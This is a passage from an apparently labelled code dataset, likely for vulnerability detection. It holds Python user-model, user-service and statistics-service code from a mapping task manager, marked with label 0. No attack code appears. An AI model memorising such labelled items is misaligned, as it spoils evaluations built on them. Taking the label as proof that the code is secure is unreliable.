ProjectStatus, UserRole\nfrom server.models.postgis.utils import NotFound, timestamp\n\nclass User(db.Model):\n    \"\"\" Describes the history associated with a task \"\"\"\n    __tablename__ = \"users\"\n\n    id = db.Column(db.BigInteger, primary_key=True, index=True)\n    validation_message = db.Column(db.Boolean, default=True, nullable=False)\n    username = db.Column(db.String, unique=True)\n    role = db.Column(db.Integer, default=0, nullable=False)\n    mapping_level = db.Column(db.Integer, default=1, nullable=False)\n    projects_mapped = db.Column(db.Integer, default=1, nullable=False)\n    tasks_mapped = db.Column(db.Integer, default=0, nullable=False)\n    tasks_validated = db.Column(db.Integer, default=0, nullable=False)\n    tasks_invalidated = db.Column(db.Integer, default=0, nullable=False)\n    projects_mapped = db.Column(db.ARRAY(db.Integer))\n    email_address = db.Column(db.String)\n    is_email_verified = db.Column(db.Boolean, default=False)\n    is_expert = db.Column(db.Boolean, default=False)\n    twitter_id = db.Column(db.String)\n    facebook_id = db.Column(db.String)\n    linkedin_id = db.Column(db.String)\n    date_registered = db.Column(db.DateTime, default=timestamp)\n    # Represents the date the user last had one of their tasks validated\n    last_validation_date = db.Column(db.DateTime, default=timestamp)\n\n    # Relationships\n    accepted_licenses = db.relationship(\"License\", secondary=users_licenses_table)\n\n    def create(self):\n        \"\"\" Creates and saves the current model to the DB \"\"\"\n        db.session.add(self)\n        db.session.commit()\n\n    def save(self):\n        db.session.commit()\n\n    def get_by_id(self, user_id: int):\n        \"\"\" Return the user for the specified id, or None if not found \"\"\"\n        return User.query.get(user_id)\n\n    def get_by_username(self, username: str):\n        \"\"\" Return the user for the specified username, or None if not found \"\"\"\n        return User.query.filter_by(username=username).one_or_none()\n\n    def update_username(self, username: str):\n        \"\"\" Update the username \"\"\"\n        self.username = username\n        db.session.commit()\n\n    def update(self, user_dto: UserDTO):\n        \"\"\" Update the user details \"\"\"\n        self.email_address = user_dto.email_address.lower() if user_dto.email_address else None\n        self.twitter_id = user_dto.twitter_id.lower() if user_dto.twitter_id else None\n        self.facebook_id = user_dto.facebook_id.lower() if user_dto.facebook_id else None\n        self.linkedin_id = user_dto.linkedin_id.lower() if user_dto.linkedin_id else None\n        self.validation_message = user_dto.validation_message\n        db.session.commit()\n\n    def set_email_verified_status(self, is_verified: bool):\n        \"\"\" Updates email verfied flag on successfully verified emails\"\"\"\n        self.is_email_verified = is_verified\n        db.session.commit()\n\n    def set_is_expert(self, is_expert: bool):\n        \"\"\" Enables or disables expert mode on the user\"\"\"\n        self.is_expert = is_expert\n        db.session.commit()\n\n    @staticmethod\n    def get_all_users(query: UserSearchQuery) -> UserSearchDTO:\n        \"\"\" Search and filter all users \"\"\"\n\n        # Base query that applies to all searches\n        base = db.session.query(User.id, User.username, User.mapping_level, User.role)\n\n        # Add filter to query as required\n        if query.mapping_level:\n            base = base.filter(User.mapping_level == MappingLevel[query.mapping_level.upper()].value)\n        if query.username:\n            base = base.filter(User.username.ilike(query.username.lower() + '%'))\n        if query.role:\n            base = base.filter(User.role == UserRole[query.role.upper()].value)\n\n        results = base.order_by(User.username).paginate(query.page, 20, True)\n\n        dto = UserSearchDTO()\n        for result in results.items:\n            listed_user = ListedUser()\n            listed_user.id = result.id\n            listed_user.mapping_level = MappingLevel(result.mapping_level).name\n            listed_user.username = result.username\n            listed_user.role = UserRole(result.role).name\n\n            dto.users.append(listed_user)\n\n        dto.pagination = Pagination(results)\n        return dto\n\n    @staticmethod\n    def get_all_users_not_pagainated():\n        \"\"\" Get all users in DB\"\"\"\n        return db.session.query(User.id).all()\n\n\n    @staticmethod\n    def filter_users(user_filter: str, project_id: int, page: int) -> UserFilterDTO:\n        \"\"\" Finds users that matches first characters, for auto-complete.\n\n        Users who have participated (mapped or validated) in the project, if given, will be\n        returned ahead of those who have not.\n        \"\"\"\n        # Note that the projects_mapped column includes both mapped and validated projects.\n        results = db.session.query(User.username, User.projects_mapped.any(project_id).label(\"participant\")) \\\n            .filter(User.username.ilike(user_filter.lower() + '%')) \\\n            .order_by(desc(\"participant\").nullslast(), User.username).paginate(page, 20, True)\n        if results.total == 0:\n            raise NotFound()\n\n        dto = UserFilterDTO()\n        for result in results.items:\n            dto.usernames.append(result.username)\n            if project_id is not None:\n                participant = ProjectParticipantUser()\n                participant.username = result.username\n                participant.project_id = project_id\n                participant.is_participant = bool(result.participant)\n                dto.users.append(participant)\n\n        dto.pagination = Pagination(results)\n        return dto\n\n    @staticmethod\n    def upsert_mapped_projects(user_id: int, project_id: int):\n        \"\"\" Adds projects to mapped_projects if it doesn't exist \"\"\"\n        sql = \"select * from users where id = :user_id and projects_mapped @> '{{:project_id}}'\"\n        result = db.engine.execute(text(sql), user_id=user_id, project_id=project_id)\n\n        if result.rowcount > 0:\n            return  # User has previously mapped this project so return\n\n        sql = '''update users\n                    set projects_mapped = array_append(projects_mapped, :project_id)\n                  where id = :user_id'''\n\n        db.engine.execute(text(sql), project_id=project_id, user_id=user_id)\n\n    @staticmethod\n    def get_mapped_projects(user_id: int, preferred_locale: str) -> UserMappedProjectsDTO:\n        \"\"\" Get all projects a user has mapped on \"\"\"\n\n        # This query looks scary, but we're really just creating an outer join between the query that gets the\n        # counts of all mapped tasks and the query that gets counts of all validated tasks.  This is necessary to\n        # handle cases where users have only validated tasks on a project, or only mapped on a project.\n        sql = '''SELECT p.id,\n                        p.status,\n                        p.default_locale,\n                        c.mapped,\n                        c.validated,\n                        st_asgeojson(p.centroid)\n                   FROM projects p,\n                        (SELECT coalesce(v.project_id, m.project_id) project_id,\n                                coalesce(v.validated, 0) validated,\n                                coalesce(m.mapped, 0) mapped\n                          FROM (SELECT t.project_id,\n                                       count (t.validated_by) validated\n                                  FROM tasks t\n                                 WHERE t.project_id IN (SELECT unnest(projects_mapped) FROM users WHERE id = :user_id)\n                                   AND t.validated_by = :user_id\n                                 GROUP BY t.project_id, t.validated_by) v\n                         FULL OUTER JOIN\n                        (SELECT t.project_id,\n                                count(t.mapped_by) mapped\n                           FROM tasks t\n                          WHERE t.project_id IN (SELECT unnest(projects_mapped) FROM users WHERE id = :user_id)\n                            AND t.mapped_by = :user_id\n                          GROUP BY t.project_id, t.mapped_by) m\n                         ON v.project_id = m.project_id) c\n                   WHERE p.id = c.project_id ORDER BY p.id DESC'''\n\n        results = db.engine.execute(text(sql), user_id=user_id)\n\n        if results.rowcount == 0:\n            raise NotFound()\n\n        mapped_projects_dto = UserMappedProjectsDTO()\n        for row in results:\n            mapped_project = MappedProject()\n            mapped_project.project_id = row[0]\n            mapped_project.status = ProjectStatus(row[1]).name\n            mapped_project.tasks_mapped = row[3]\n            mapped_project.tasks_validated = row[4]\n            mapped_project.centroid = geojson.loads(row[5])\n\n            project_info = ProjectInfo.get_dto_for_locale(row[0], preferred_locale, row[2])\n            mapped_project.name = project_info.name\n\n            mapped_projects_dto.mapped_projects.append(mapped_project)\n\n        return mapped_projects_dto\n\n    def set_user_role(self, role: UserRole):\n        \"\"\" Sets the supplied role on the user \"\"\"\n        self.role = role.value\n        db.session.commit()\n\n    def set_mapping_level(self, level: MappingLevel):\n        \"\"\" Sets the supplied level on the user \"\"\"\n        self.mapping_level = level.value\n        db.session.commit()\n\n    def accept_license_terms(self, license_id: int):\n        \"\"\" Associate the user in scope with the supplied license \"\"\"\n        image_license = License.get_by_id(license_id)\n        self.accepted_licenses.append(image_license)\n        db.session.commit()\n\n    def has_user_accepted_licence(self, license_id: int):\n        \"\"\" Test to see if the user has accepted the terms of the specified license\"\"\"\n        image_license = License.get_by_id(license_id)\n\n        if image_license in self.accepted_licenses:\n            return True\n\n        return False\n\n    def delete(self):\n        \"\"\" Delete the user in scope from DB \"\"\"\n        db.session.delete(self)\n        db.session.commit()\n\n    def as_dto(self, logged_in_username: str) -> UserDTO:\n        \"\"\" Create DTO object from user in scope \"\"\"\n        user_dto = UserDTO()\n        user_dto.id = self.id\n        user_dto.username = self.username\n        user_dto.role = UserRole(self.role).name\n        user_dto.mapping_level = MappingLevel(self.mapping_level).name\n        user_dto.is_expert = self.is_expert or False\n        user_dto.date_registered = str(self.date_registered)\n        try:\n            user_dto.projects_mapped = len(self.projects_mapped)\n        # Handle users that haven't touched a project yet.\n        except:\n            user_dto.projects_mapped = 0\n        user_dto.tasks_mapped = self.tasks_mapped\n        user_dto.tasks_validated = self.tasks_validated\n        user_dto.tasks_invalidated = self.tasks_invalidated\n        user_dto.twitter_id = self.twitter_id\n        user_dto.linkedin_id = self.linkedin_id\n        user_dto.facebook_id = self.facebook_id\n        user_dto.validation_message = self.validation_message\n        user_dto.total_time_spent = 0\n        user_dto.time_spent_mapping = 0\n        user_dto.time_spent_validating = 0\n\n        sql = \"\"\"SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history\n                WHERE action='LOCKED_FOR_VALIDATION'\n                and user_id = :user_id;\"\"\"\n        total_validation_time = db.engine.execute(text(sql), user_id=self.id)\n        for row in total_validation_time:\n            total_validation_time = row[0]\n            if total_validation_time:\n                total_validation_seconds = total_validation_time.total_seconds()\n                user_dto.time_spent_validating = total_validation_seconds\n                user_dto.total_time_spent += user_dto.time_spent_validating\n\n        sql = \"\"\"SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history\n                WHERE action='LOCKED_FOR_MAPPING'\n                and user_id = :user_id;\"\"\"\n        total_mapping_time = db.engine.execute(text(sql), user_id=self.id)\n        for row in total_mapping_time:\n            total_mapping_time = row[0]\n            if total_mapping_time:\n                total_mapping_seconds = total_mapping_time.total_seconds()\n                user_dto.time_spent_mapping = total_mapping_seconds\n                user_dto.total_time_spent += user_dto.time_spent_mapping\n\n        if self.username == logged_in_username:\n            # Only return email address when logged in user is looking at their own profile\n            user_dto.email_address = self.email_address\n            user_dto.is_email_verified = self.is_email_verified\n        return user_dto\n/n/n/nserver/services/stats_service.py/n/nfrom cachetools import TTLCache, cached\n\nfrom sqlalchemy import func, text\nfrom server import db\nfrom server.models.dtos.stats_dto import (\n    ProjectContributionsDTO, UserContribution, Pagination, TaskHistoryDTO,\n    ProjectActivityDTO, HomePageStatsDTO, OrganizationStatsDTO,\n    CampaignStatsDTO\n    )\nfrom server.models.postgis.project import Project\nfrom server.models.postgis.statuses import TaskStatus\nfrom server.models.postgis.task import TaskHistory, User, Task\nfrom server.models.postgis.utils import timestamp, NotFound\nfrom server.services.project_service import ProjectService\nfrom server.services.users.user_service import UserService\n\n\nhomepage_stats_cache = TTLCache(maxsize=4, ttl=30)\n\n\nclass StatsService:\n\n    @staticmethod\n    def update_stats_after_task_state_change(project_id: int, user_id: int, last_state: TaskStatus,\n                                             new_state: TaskStatus, action='change'):\n        \"\"\" Update stats when a task has had a state change \"\"\"\n\n        if new_state in [TaskStatus.READY, TaskStatus.LOCKED_FOR_VALIDATION, TaskStatus.LOCKED_FOR_MAPPING]:\n            return  # No stats to record for these states\n\n        project = ProjectService.get_project_by_id(project_id)\n        user = UserService.get_user_by_id(user_id)\n\n        StatsService._update_tasks_stats(project, user, last_state, new_state, action)\n        UserService.upsert_mapped_projects(user_id, project_id)\n        project.last_updated = timestamp()\n\n        # Transaction will be saved when task is saved\n        return project, user\n\n    @staticmethod\n    def _update_tasks_stats(project: Project, user: User, last_state: TaskStatus, new_state: TaskStatus,\n                            action='change'):\n\n        # Make sure you are aware that users table has it as incrementing counters,\n        # while projects table reflect the actual state, and both increment and decrement happens\n\n        # Set counters for new state\n        if new_state == TaskStatus.MAPPED:\n            project.tasks_mapped += 1\n        elif new_state == TaskStatus.VALIDATED:\n            project.tasks_validated += 1\n        elif new_state == TaskStatus.BADIMAGERY:\n            project.tasks_bad_imagery += 1\n\n        if action == 'change':\n            if new_state == TaskStatus.MAPPED:\n                user.tasks_mapped += 1\n            elif new_state == TaskStatus.VALIDATED:\n                user.tasks_validated += 1\n            elif new_state == TaskStatus.INVALIDATED:\n                user.tasks_invalidated += 1\n\n        # Remove counters for old state\n        if last_state == TaskStatus.MAPPED:\n            project.tasks_mapped -= 1\n        elif last_state == TaskStatus.VALIDATED:\n            project.tasks_validated -= 1\n        elif last_state == TaskStatus.BADIMAGERY:\n            project.tasks_bad_imagery -= 1\n\n        if action == 'undo':\n            if last_state == TaskStatus.MAPPED:\n                user.tasks_mapped -= 1\n            elif last_state == TaskStatus.VALIDATED:\n                user.tasks_validated -= 1\n            elif last_state == TaskStatus.INVALIDATED:\n                user.tasks_invalidated -= 1\n\n    @staticmethod\n    def get_latest_activity(project_id: int, page: int) -> ProjectActivityDTO:\n        \"\"\" Gets all the activity on a project \"\"\"\n\n        results = db.session.query(\n                TaskHistory.id, TaskHistory.task_id, TaskHistory.action, TaskHistory.action_date,\n                TaskHistory.action_text, User.username\n            ).join(User).filter(\n                TaskHistory.project_id == project_id,\n                TaskHistory.action != 'COMMENT'\n            ).order_by(\n                TaskHistory.action_date.desc()\n            ).paginate(page, 10, True)\n\n        if results.total == 0:\n            raise NotFound()\n\n        activity_dto = ProjectActivityDTO()\n        for item in results.items:\n            history = TaskHistoryDTO()\n            history.history_id = item.id\n            history.task_id = item.task_id\n            history.action = item.action\n            history.action_text = item.action_text\n            history.action_date = item.action_date\n            history.action_by = item.username\n            activity_dto.activity.append(history)\n\n        activity_dto.pagination = Pagination(results)\n        return activity_dto\n\n    @staticmethod\n    def get_user_contributions(project_id: int) -> ProjectContributionsDTO:\n        \"\"\" Get all user contributions on a project\"\"\"\n        contrib_query = '''select m.mapped_by, m.username, m.mapped, v.validated_by, v.username, v.validated\n                             from (select t.mapped_by, u.username, count(t.mapped_by) mapped\n                                     from tasks t,\n                                          users u\n                                    where t.mapped_by = u.id\n                                      and t.project_id = :project_id\n                                      and t.mapped_by is not null\n                                    group by t.mapped_by, u.username) m FULL OUTER JOIN\n                                  (select t.validated_by, u.username, count(t.validated_by) validated\n                                     from tasks t,\n                                          users u\n                                    where t.validated_by = u.id\n                                      and t.project_id = :project_id\n                                      and t.validated_by is not null\n                                    group by t.validated_by, u.username) v\n                                       ON m.mapped_by = v.validated_by\n        '''\n\n        results = db.engine.execute(text(contrib_query), project_id=project_id)\n        if results.rowcount == 0:\n            raise NotFound()\n\n        contrib_dto = ProjectContributionsDTO()\n        for row in results:\n            user_id = row[0] or row[3]\n            user_contrib = UserContribution()\n            user_contrib.username = row[1] if row[1] else row[4]\n            user_contrib.mapped = row[2] if row[2] else 0\n            user_contrib.validated = row[5] if row[5] else 0\n            contrib_dto.user_contributions.append(user_contrib)\n        return contrib_dto\n\n    @staticmethod\n    @cached(homepage_stats_cache)\n    def get_homepage_stats() -> HomePageStatsDTO:\n        \"\"\" Get overall TM stats to give community a feel for progress that's being made \"\"\"\n        dto = HomePageStatsDTO()\n\n        dto.total_projects = Project.query.count()\n        dto.mappers_online = Task.query.filter(\n            Task.locked_by is not None\n            ).distinct(Task.locked_by).count()\n        dto.total_mappers = User.query.count()\n        dto.total_validators = Task.query.filter(\n            Task.task_status == TaskStatus.VALIDATED.value\n            ).distinct(Task.validated_by).count()\n        dto.tasks_mapped = Task.query.filter(\n            Task.task_status.in_(\n                (TaskStatus.MAPPED.value, TaskStatus.VALIDATED.value)\n                )\n            ).count()\n        dto.tasks_validated = Task.query.filter(\n            Task.task_status == TaskStatus.VALIDATED.value\n            ).count()\n\n        org_proj_count = db.session.query(\n            Project.organisation_tag,\n            func.count(Project.organisation_tag)\n        ).group_by(Project.organisation_tag).all()\n\n        untagged_count = 0\n\n        # total_area = 0\n\n\n\n       # dto.total_area = 0\n\n        # total_area_sql = \"\"\"select sum(ST_Area(geometry)) from public.projects as area\"\"\"\n\n        # total_area_result = db.engine.execute(total_area_sql)\n        # current_app.logger.debug(total_area_result)\n        # for rowproxy in total_area_result:\n            # rowproxy.items() returns an array like [(key0, value0), (key1, value1)]\n            # for tup in rowproxy.items():\n                # total_area += tup[1]\n                # current_app.logger.debug(total_area)\n        # dto.total_area = total_area\n\n        tasks_mapped_sql = \"select coalesce(sum(ST_Area(geometry)), 0) as sum from public.tasks where task_status = :task_status\"\n        tasks_mapped_result = db.engine.execute(text(tasks_mapped_sql), task_status=TaskStatus.MAPPED.value)\n\n        dto.total_mapped_area = tasks_mapped_result.fetchone()['sum']\n\n        tasks_validated_sql = \"select coalesce(sum(ST_Area(geometry)), 0) as sum from public.tasks where task_status = :task_status\"\n        tasks_validated_result = db.engine.execute(text(tasks_validated_sql), task_status=TaskStatus.VALIDATED.value)\n\n        dto.total_validated_area = tasks_validated_result.fetchone()['sum']\n\n        campaign_count = db.session.query(Project.campaign_tag, func.count(Project.campaign_tag))\\\n            .group_by(Project.campaign_tag).all()\n        no_campaign_count = 0\n        unique_campaigns = 0\n\n        for tup in campaign_count:\n            campaign_stats = CampaignStatsDTO(tup)\n            if campaign_stats.tag:\n                dto.campaigns.append(campaign_stats)\n                unique_campaigns += 1\n            else:\n                no_campaign_count += campaign_stats.projects_created\n\n        if no_campaign_count:\n            no_campaign_proj = CampaignStatsDTO(('Untagged', no_campaign_count))\n            dto.campaigns.append(no_campaign_proj)\n        dto.total_campaigns = unique_campaigns\n\n        org_proj_count = db.session.query(Project.organisation_tag, func.count(Project.organisation_tag))\\\n            .group_by(Project.organisation_tag).all()\n        no_org_count = 0\n        unique_orgs = 0\n\n        for tup in org_proj_count:\n            org_stats = OrganizationStatsDTO(tup)\n            if org_stats.tag:\n                dto.organizations.append(org_stats)\n                unique_orgs += 1\n            else:\n                no_org_count += org_stats.projects_created\n\n        if no_org_count:\n            no_org_proj = OrganizationStatsDTO(('Untagged', no_org_count))\n            dto.organizations.append(no_org_proj)\n        dto.total_organizations = unique_orgs\n\n        return dto\n/n/n/nserver/services/users/user_service.py/n/nfrom cachetools import TTLCache, cached\nfrom flask import current_app\nfrom functools import reduce\nimport dateutil.parser\nimport datetime\n\nfrom sqlalchemy import text\n\nfrom server import db\nfrom server.models.dtos.user_dto import UserDTO, UserOSMDTO, UserFilterDTO, UserSearchQuery, UserSearchDTO, \\\n    UserStatsDTO\nfrom server.models.dtos.message_dto import MessageDTO\nfrom server.models.postgis.message import Message\nfrom server.models.postgis.task import TaskHistory\nfrom server.models.postgis.user import User, UserRole, MappingLevel\nfrom server.models.postgis.utils import NotFound\nfrom server.services.users.osm_service import OSMService, OSMServiceError\nfrom server.services.messaging.smtp_service import SMTPService\nfrom server.services.messaging.template_service import get_template\n\nuser_filter_cache = TTLCache(maxsize=1024, ttl=600)\nuser_all_cache = TTLCache(maxsize=1024, ttl=600)\n\n\nclass UserServiceError(Exception):\n    \"\"\" Custom Exception to notify callers an error occurred when in the User Service \"\"\"\n\n    def __init__(self, message):\n        if current_app:\n            current_app.logger.error(message)\n\n\nclass UserService:\n    @staticmethod\n    def get_user_by_id(user_id: int) -> User:\n        user = User().get_by_id(user_id)\n\n        if user is None:\n            raise NotFound()\n\n        return user\n\n    @staticmethod\n    def get_user_by_username(username: str) -> User:\n        user = User().get_by_username(username)\n\n        if user is None:\n            raise NotFound()\n\n        return user\n\n    @staticmethod\n    def update_username(user_id: int, osm_username: str) -> User:\n        user = UserService.get_user_by_id(user_id)\n        if user.username != osm_username:\n            user.update_username(osm_username)\n\n        return user\n\n    @staticmethod\n    def register_user(osm_id, username, changeset_count):\n        \"\"\"\n        Creates user in DB\n        :param osm_id: Unique OSM user id\n        :param username: OSM Username\n        :param changeset_count: OSM changeset count\n        \"\"\"\n        new_user = User()\n        new_user.id = osm_id\n        new_user.username = username\n\n        intermediate_level = current_app.config['MAPPER_LEVEL_INTERMEDIATE']\n        advanced_level = current_app.config['MAPPER_LEVEL_ADVANCED']\n\n        if changeset_count > advanced_level:\n            new_user.mapping_level = MappingLevel.ADVANCED.value\n        elif intermediate_level < changeset_count < advanced_level:\n            new_user.mapping_level = MappingLevel.INTERMEDIATE.value\n        else:\n            new_user.mapping_level = MappingLevel.BEGINNER.value\n\n        new_user.create()\n        return new_user\n\n    @staticmethod\n    def get_user_dto_by_username(requested_username: str, logged_in_user_id: int) -> UserDTO:\n        \"\"\"Gets user DTO for supplied username \"\"\"\n        requested_user = UserService.get_user_by_username(requested_username)\n        logged_in_user = UserService.get_user_by_id(logged_in_user_id)\n        UserService.check_and_update_mapper_level(requested_user.id)\n\n        return requested_user.as_dto(logged_in_user.username)\n\n    @staticmethod\n    def get_user_dto_by_id(requested_user: int) -> UserDTO:\n        \"\"\"Gets user DTO for supplied user id \"\"\"\n        requested_user = UserService.get_user_by_id(requested_user)\n\n        return requested_user.as_dto(requested_user.username)\n\n    @staticmethod\n    def get_detailed_stats(username: str):\n        user = UserService.get_user_by_username(username)\n        stats_dto = UserStatsDTO()\n\n        actions = TaskHistory.query.filter(\n            TaskHistory.user_id == user.id,\n            TaskHistory.action_text != ''\n        ).all()\n\n        tasks_mapped = TaskHistory.query.filter(\n            TaskHistory.user_id == user.id,\n            TaskHistory.action_text == 'MAPPED'\n        ).count()\n        tasks_validated = TaskHistory.query.filter(\n            TaskHistory.user_id == user.id,\n            TaskHistory.action_text == 'VALIDATED'\n        ).count()\n        projects_mapped = TaskHistory.query.filter(\n            TaskHistory.user_id == user.id,\n            TaskHistory.action == 'STATE_CHANGE'\n        ).distinct(TaskHistory.project_id).count()\n\n        stats_dto.tasks_mapped = tasks_mapped\n        stats_dto.tasks_validated = tasks_validated\n        stats_dto.projects_mapped = projects_mapped\n        stats_dto.total_time_spent = 0\n        stats_dto.time_spent_mapping = 0\n        stats_dto.time_spent_validating = 0\n\n        sql = \"\"\"SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history\n                WHERE action='LOCKED_FOR_VALIDATION'\n                and user_id = :user_id;\"\"\"\n        total_validation_time = db.engine.execute(text(sql), user_id=user.id)\n        for time in total_validation_time:\n            total_validation_time = time[0]\n            if total_validation_time:\n                stats_dto.time_spent_validating = total_validation_time.total_seconds()\n                stats_dto.total_time_spent += stats_dto.time_spent_validating\n\n        sql = \"\"\"SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history\n                WHERE action='LOCKED_FOR_MAPPING'\n                and user_id = :user_id;\"\"\"\n        total_mapping_time = db.engine.execute(text(sql), user_id=user.id)\n        for time in total_mapping_time:\n            total_mapping_time = time[0]\n            if total_mapping_time:\n                stats_dto.time_spent_mapping = total_mapping_time.total_seconds()\n                stats_dto.total_time_spent += stats_dto.time_spent_mapping\n\n        return stats_dto\n\n\n    @staticmethod\n    def update_user_details(user_id: int, user_dto: UserDTO) -> dict:\n        \"\"\" Update user with info supplied by user, if they add or change their email address a verification mail\n            will be sent \"\"\"\n        user = UserService.get_user_by_id(user_id)\n\n        verification_email_sent = False\n        if user_dto.email_address and user.email_address != user_dto.email_address.lower():\n            # Send user verification email if they are adding or changing their email address\n            SMTPService.send_verification_email(user_dto.email_address.lower(), user.username)\n            user.set_email_verified_status(is_verified=False)\n            verification_email_sent = True\n\n        user.update(user_dto)\n        return dict(verificationEmailSent=verification_email_sent)\n\n    @staticmethod\n    @cached(user_all_cache)\n    def get_all_users(query: UserSearchQuery) -> UserSearchDTO:\n        \"\"\" Gets paginated list of users \"\"\"\n        return User.get_all_users(query)\n\n    @staticmethod\n    @cached(user_filter_cache)\n    def filter_users(username: str, project_id: int, page: int) -> UserFilterDTO:\n        \"\"\" Gets paginated list of users, filtered by username, for autocomplete \"\"\"\n        return User.filter_users(username, project_id, page)\n\n    @staticmethod\n    def is_user_a_project_manager(user_id: int) -> bool:\n        \"\"\" Is the user a project manager \"\"\"\n        user = UserService.get_user_by_id(user_id)\n        if UserRole(user.role) in [UserRole.ADMIN, UserRole.PROJECT_MANAGER]:\n            return True\n\n        return False\n\n    @staticmethod\n    def get_mapping_level(user_id: int):\n        \"\"\" Gets mapping level user is at\"\"\"\n        user = UserService.get_user_by_id(user_id)\n\n        return MappingLevel(user.mapping_level)\n\n    @staticmethod\n    def is_user_validator(user_id: int) -> bool:\n        \"\"\" Determines if user is a validator \"\"\"\n        user = UserService.get_user_by_id(user_id)\n\n        if UserRole(user.role) in [UserRole.VALIDATOR, UserRole.ADMIN, UserRole.PROJECT_MANAGER]:\n            return True\n\n        return False\n\n    @staticmethod\n    def is_user_blocked(user_id: int) -> bool:\n        \"\"\" Determines if a user is blocked \"\"\"\n        user = UserService.get_user_by_id(user_id)\n\n        if UserRole(user.role) == UserRole.READ_ONLY:\n            return True\n\n        return False\n\n    @staticmethod\n    def upsert_mapped_projects(user_id: int, project_id: int):\n        \"\"\" Add project to mapped projects if it doesn't exist, otherwise return \"\"\"\n        User.upsert_mapped_projects(user_id, project_id)\n\n    @staticmethod\n    def get_mapped_projects(user_name: str, preferred_locale: str):\n        \"\"\" Gets all projects a user has mapped or validated on \"\"\"\n        user = UserService.get_user_by_username(user_name)\n        return User.get_mapped_projects(user.id, preferred_locale)\n\n    @staticmethod\n    def add_role_to_user(admin_user_id: int, username: str, role: str):\n        \"\"\"\n        Add role to user\n        :param admin_user_id: ID of admin attempting to add the role\n        :param username: Username of user the role should be added to\n        :param role: The requested role\n        :raises UserServiceError\n        \"\"\"\n        try:\n            requested_role = UserRole[role.upper()]\n        except KeyError:\n            raise UserServiceError(f'Unknown role {role} accepted values are ADMIN, PROJECT_MANAGER, VALIDATOR')\n\n        admin = UserService.get_user_by_id(admin_user_id)\n        admin_role = UserRole(admin.role)\n\n        if admin_role == UserRole.PROJECT_MANAGER and requested_role == UserRole.ADMIN:\n            raise UserServiceError(f'You must be an Admin to assign Admin role')\n\n        if admin_role == UserRole.PROJECT_MANAGER and requested_role == UserRole.PROJECT_MANAGER:\n            raise UserServiceError(f'You must be an Admin to assign Project Manager role')\n\n        user = UserService.get_user_by_username(username)\n        user.set_user_role(requested_role)\n\n    @staticmethod\n    def set_user_mapping_level(username: str, level: str) -> User:\n        \"\"\"\n        Sets the users mapping level\n        :raises: UserServiceError\n        \"\"\"\n        try:\n            requested_level = MappingLevel[level.upper()]\n        except KeyError:\n            raise UserServiceError(f'Unknown role {level} accepted values are BEGINNER, INTERMEDIATE, ADVANCED')\n\n        user = UserService.get_user_by_username(username)\n        user.set_mapping_level(requested_level)\n\n        return user\n\n    @staticmethod\n    def set_user_is_expert(user_id: int, is_expert: bool) -> User:\n        \"\"\"\n        Enabled or disables expert mode for the user\n        :raises: UserServiceError\n        \"\"\"\n        user = UserService.get_user_by_id(user_id)\n        user.set_is_expert(is_expert)\n\n        return user\n\n    @staticmethod\n    def accept_license_terms(user_id: int, license_id: int):\n        \"\"\" Saves the fact user has accepted license terms \"\"\"\n        user = UserService.get_user_by_id(user_id)\n        user.accept_license_terms(license_id)\n\n    @staticmethod\n    def has_user_accepted_license(user_id: int, license_id: int):\n        \"\"\" Checks if user has accepted specified license \"\"\"\n        user = UserService.get_user_by_id(user_id)\n        return user.has_user_accepted_licence(license_id)\n\n    @staticmethod\n    def get_osm_details_for_user(username: str) -> UserOSMDTO:\n        \"\"\"\n        Gets OSM details for the user from OSM API\n        :param username: username in scope\n        :raises UserServiceError, NotFound\n        \"\"\"\n        user = UserService.get_user_by_username(username)\n        osm_dto = OSMService.get_osm_details_for_user(user.id)\n        return osm_dto\n\n    @staticmethod\n    def check_and_update_mapper_level(user_id: int):\n        \"\"\" Check users mapping level and update if they have crossed threshold \"\"\"\n        user = UserService.get_user_by_id(user_id)\n        user_level = MappingLevel(user.mapping_level)\n\n        if user_level == MappingLevel.ADVANCED:\n            return  # User has achieved highest level, so no need to do further checking\n\n        intermediate_level = current_app.config['MAPPER_LEVEL_INTERMEDIATE']\n        advanced_level = current_app.config['MAPPER_LEVEL_ADVANCED']\n\n        try:\n            osm_details = OSMService.get_osm_details_for_user(user_id)\n            if (osm_details.changeset_count > advanced_level and\n                user.mapping_level !=  MappingLevel.ADVANCED.value):\n                user.mapping_level = MappingLevel.ADVANCED.value\n                UserService.notify_level_upgrade(user_id, user.username, 'ADVANCED')\n            elif (intermediate_level < osm_details.changeset_count < advanced_level and\n                user.mapping_level != MappingLevel.INTERMEDIATE.value):\n                user.mapping_level = MappingLevel.INTERMEDIATE.value\n                UserService.notify_level_upgrade(user_id, user.username, 'INTERMEDIATE')\n        except OSMServiceError:\n            # Swallow exception as we don't want to blow up the server for this\n            current_app.logger.error('Error attempting to update mapper level')\n            return\n\n\n        user.save()\n        return user\n\n    def notify_level_upgrade(user_id: int, username: str, level: str):\n        text_template = get_template('level_upgrade_message_en.txt')\n\n        if username is not None:\n            text_template = text_template.replace('[USERNAME]', username)\n\n        text_template = text_template.replace('[LEVEL]', level)\n        level_upgrade_message = Message()\n        level_upgrade_message.to_user_id = user_id\n        level_upgrade_message.subject = 'Mapper Level Upgrade '\n        level_upgrade_message.message = text_template\n        level_upgrade_message.save()\n\n\n    @staticmethod\n    def refresh_mapper_level() -> int:\n        \"\"\" Helper function to run thru all users in the DB and update their mapper level \"\"\"\n        users = User.get_all_users_not_pagainated()\n        users_updated = 1\n        total_users = len(users)\n\n        for user in users:\n            UserService.check_and_update_mapper_level(user.id)\n\n            if users_updated % 50 == 0:\n                print(f'{users_updated} users updated of {total_users}')\n\n            users_updated += 1\n\n        return users_updated\n/n/n/n", "label": 0}, {"id": "dee040a2d22b3c4d5e38e2dbf8c6b651ad4c241a", "code": "/server/models/postgis/message.py/n/nfrom server import db\nfrom flask import current_app\nfrom enum import Enum\nfrom server.models.dtos.message_dto import MessageDTO, MessagesDTO\nfrom server.models.postgis.user import User\nfrom server.models.postgis.task import Task\nfrom server.models.postgis.project import Project\nfrom server.models.postgis.utils import timestamp\nfrom server.models.postgis.utils import NotFound\n\nclass MessageType(Enum):\n    \"\"\" Describes the various kinds of messages a user might receive \"\"\"\n    SYSTEM = 1                     # Generic system-generated message\n    BROADCAST = 2                  # Broadcast message from a project manager\n    MENTION_NOTIFICATION = 3       # Notification 